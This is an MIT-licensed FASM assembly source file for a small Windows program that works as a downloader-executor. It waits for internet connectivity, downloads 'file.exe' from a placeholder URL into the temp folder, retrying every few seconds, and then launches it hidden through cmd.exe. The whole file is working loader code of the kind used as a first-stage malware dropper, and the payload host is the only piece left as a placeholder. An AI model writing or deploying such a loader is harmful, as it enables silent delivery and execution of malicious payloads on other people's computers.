;MIT License

;Copyright (c) 2022 kadzicu

;Permission is hereby granted, free of charge, to any person obtaining a copy
;of this software and associated documentation files (the "Software"), to deal
;in the Software without restriction, including without limitation the rights
;to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
;copies of the Software, and to permit persons to whom the Software is
;furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included in all
;copies or substantial portions of the Software.

;THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
;IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
;FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
;AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
;LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
;OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
;SOFTWARE.

format PE console
entry start
include 'win32a.inc'

section '.data' data readable writable

        tmpDir rb 256
        fileDir rb 256
        param rb 256

        sleepSeconds dd 5

        url db 'http://file.exe',0
        fileName db 'file.exe',0

        s1 db '/C ',0
        s2 db 'open',0
        s3 db 'cmd.exe',0

section '.code' code readable executable

        start:
                invoke GetTempPath,tmpDir,tmpDir

                invoke strcpy_s,fileDir,fileDir,tmpDir
                invoke strcat_s,fileDir,fileDir,fileName

                invoke strcpy_s,param,param,s1
                invoke strcat_s,param,param,fileDir
restart:
                invoke PathFileExists,fileDir
                cmp eax,0
                jz download ; false
                jne run     ; true
download:
                invoke InternetGetConnectedState,0,0
                cmp eax,0
                jz sleep ; false

                invoke URLDownloadToFile,0,url,fileDir,0,0
                cmp eax,0
                jne sleep ; false
                jz run    ; true
run:
                invoke ShellExecute,0,s2,s3,param,0,0
                jmp exit
sleep:
                mov eax,sleepSeconds
                mov ebx,1000
                mul ebx

                invoke Sleep,eax
                jmp restart
exit:
                invoke ExitProcess,0

section '.idata' import data readable

        library kernel32, 'kernel32.dll',\
                wininet, 'wininet.dll',\
                urlmon, 'urlmon.dll',\
                shlwapi, 'shlwapi.dll',\
                msvcrt, 'msvcrt.dll',\
                shell32, 'shell32.dll'

        import kernel32,\
               ExitProcess, 'ExitProcess',\
               GetTempPath, 'GetTempPathA',\
               Sleep, 'Sleep'

        import wininet,\
               InternetGetConnectedState, 'InternetGetConnectedState'

        import urlmon,\
               URLDownloadToFile, 'URLDownloadToFileA'

        import shlwapi,\
               PathFileExists, 'PathFileExistsA'

        import msvcrt,\
               strcpy_s, 'strcpy_s',\
               strcat_s, 'strcat_s'

        import shell32,\
               ShellExecute, 'ShellExecuteA'
